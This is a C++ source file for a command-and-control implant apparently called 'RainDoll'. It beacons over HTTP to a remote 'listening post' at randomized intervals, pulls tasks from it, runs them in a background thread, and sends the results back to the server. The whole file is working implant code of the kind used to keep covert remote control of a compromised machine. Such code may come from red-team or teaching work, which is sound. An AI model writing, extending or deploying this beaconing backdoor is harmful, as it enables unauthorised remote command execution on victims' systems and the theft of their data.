#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"
#include "tasks.h"

#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include <cpr/cpr.h>

#include <nlohmann/json.hpp>

using json = nlohmann::json;

[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port,
    std::string_view uri,
    std::string_view payload) {

    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() },
        cpr::Header{ {"Content-Type", "application/json"} }
    );

    cpr::Response response = asyncRequest.get();
    std::cout << "Request body: " << requestBody << std::endl;

    return response.text;
};

void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }

void Implant::setMeanDwell(double meanDwell) {
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

[[nodiscard]] std::string Implant::sendResults() {
    boost::property_tree::ptree resultsLocal;
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    return sendHttpRequest(host, port, uri, resultsStringStream.str());
}

void Implant::parseTasks(const std::string& response) {
    std::stringstream responseStringStream{ response };

    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        {
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) {
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning); })
            );
        }
    }
}

void Implant::serviceTasks() {
    while (isRunning) {
        std::vector<Task> localTasks;
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex };
            tasks.swap(localTasks);
        }

        for (const auto& task : localTasks) {
            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add("task_id", boost::uuids::to_string(id));
                results.add("contents", contents);
                results.add("success", success);
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    }
}

void Implant::beacon() {
    while (isRunning) {
        try {
            std::cout << "RainDoll is sending results to listening post...\n" << std::endl;
            const auto serverResponse = sendResults();
            std::cout << "\nListening post response content: " << serverResponse << std::endl;
            std::cout << "\nParsing tasks received..." << std::endl;
            parseTasks(serverResponse);
            std::cout << "\n================================================\n" << std::endl;
        }
        catch (const std::exception& e) {
            printf("\nBeaconing error: %s\n", e.what());
        }

        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };

        std::this_thread::sleep_for(sleepTimeChrono);
    }
}

Implant::Implant(std::string host, std::string port, std::string uri) :
    host{ std::move(host) },
    port{ std::move(port) },
    uri{ std::move(uri) },
    isRunning{ true },
    dwellDistributionSeconds{ 1. },
    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
}